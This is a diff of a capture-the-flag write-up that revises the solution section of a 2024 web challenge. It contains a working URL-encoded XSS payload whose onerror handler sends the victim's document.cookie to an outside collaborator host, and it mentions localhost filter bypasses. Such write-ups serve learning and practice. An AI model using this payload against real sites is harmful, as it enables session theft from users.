@@ -90,17 +90,17 @@ We started a lot of bypass techniques such as `http://0177.0.0.01`, `http://0x7f
 
 ## Solution
 
-We were pretty close of the actual solution by we were wrong by thinking the paring blacklisted the localhost IP.
-We just used the wrong payload obfuscation by using base64. The correct payload was the same as the original one we did,
-but URL encoding the special characters and from what I remember we also tried so WHAT THE F*** ???
+We were pretty close of the actual solution but we were wrong by thinking that the parsing functions blacklisted the localhost IP.
+We missed something when trying URL encoding and then base64 encoding. The correct payload was actually an URL encoded one but
+apparently we did it wrong.
 
 ```js
 http://localhost/error.html?err=%3Cimg%20src%3Dx%20onerror%3Ddocument%2Elocation%3D%22http%3A%2F%2Fzyeapckdjkrwivdzxeeabjaadiyukbx8f%2Eoast%2Efun%2F%3Fc%3D%22%2Bdocument%2Ecookie%3E
 ```
 
-In conclusion the challenge fu**** us because when we tried it,
+In conclusion the challenge trolled us because when we tried the correct payload with URL encoding only but,
 the server either did not execute the javascript (document.cookie) or the server just crashed except 
-one time for random and mysterious reason.
+one time for random and mysterious reason where we got the flag (after the CTF ended).
 
 ![img.png](/images/unbreakable_2024/fuck.png)
 
